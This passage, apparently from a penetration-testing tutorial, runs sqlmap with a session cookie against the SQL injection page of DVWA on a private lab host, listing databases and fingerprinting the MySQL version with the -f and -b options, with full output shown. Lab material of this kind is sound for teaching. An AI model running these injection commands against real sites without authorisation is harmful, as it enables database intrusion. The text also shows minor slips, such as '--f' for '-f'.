```
[*] metasploit
[*] mysql
[*] owasp10
[*] tikiwiki
[*] tikiwiki195

[02:28:43] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.33.31'
```

But the one thing that isn't exact is what MySQL version that is being used. That's no problem. We can use two different switches within sqlmap to try and figure this out, the -f and the -b switch. The -f will fingerprint MySQL, while the -b will check the banner. I usually check both just to make sure, as the banner can be turned off or even spoofed.

First, let us check to see what the fingerprint option in sqlmap tells us in the following snippet. Notice that I am using the same URL and same cookie as before. I need to capitalize on the SQL injection to get the information I need:

```
root@pi-kali:~# sqlmap -u "http://192.168.33.31/dvwa/vulnerabilities/sqli/?id=user&Submit=Submit#" --cookie="PHPSESSID=eb6e6cd3ca8532aa5abb6edf879713e7; security=low" --f
```

```
[02:51:13] [INFO] testing MySQL
[02:51:13] [WARNING] reflective value(s) found and filtering out
[02:51:13] [INFO] confirming MySQL
[02:51:14] [INFO] the back-end DBMS is MySQL
[02:51:14] [INFO] actively fingerprinting MySQL
[02:51:14] [INFO] heuristics detected web page charset 'ascii'
[02:51:14] [INFO] executing MySQL comment injection fingerprint
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: active fingerprint: MySQL >= 5.0.38 and < 5.1.2
                comment injection fingerprint: MySQL 5.0.51
[02:51:22] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.33.31'/192.168.33.31'
```

Now, let us see what the banner has to tell us with sqlmap:

```
root@pi-kali:~# sqlmap -u "http://192.168.33.31/dvwa/vulnerabilities/sqli/?id=user&Submit=Submit#" --cookie="PHPSESSID=eb6e6cd3ca8532aa5abb6edf879713e7; security=low" -b
```

```
[02:51:34] [INFO] the back-end DBMS is MySQL
[02:51:34] [INFO] fetching banner
[02:51:35] [WARNING] reflective value(s) found and filtering out
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
```